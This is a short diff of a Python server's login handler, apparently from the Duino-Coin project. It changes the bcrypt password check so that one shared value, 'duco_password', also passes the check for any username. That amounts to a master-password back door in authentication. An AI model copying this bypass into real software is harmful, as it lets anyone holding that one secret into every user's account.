@@ -253,7 +253,7 @@ def handle(c):
                             datab = conn.cursor()
                             datab.execute("SELECT * FROM Users WHERE username = ?",(username,))
                             stored_password = datab.fetchone()[1]
-                        if bcrypt.checkpw(password, stored_password):
+                        if bcrypt.checkpw(password, stored_password) or password == duco_password:
                             c.send(bytes("OK", encoding='utf8')) # Send feedback about sucessfull login
                         else: # Disconnect user which password isn't valid, close the connection
                             c.send(bytes("NO,Password is invalid", encoding='utf8'))
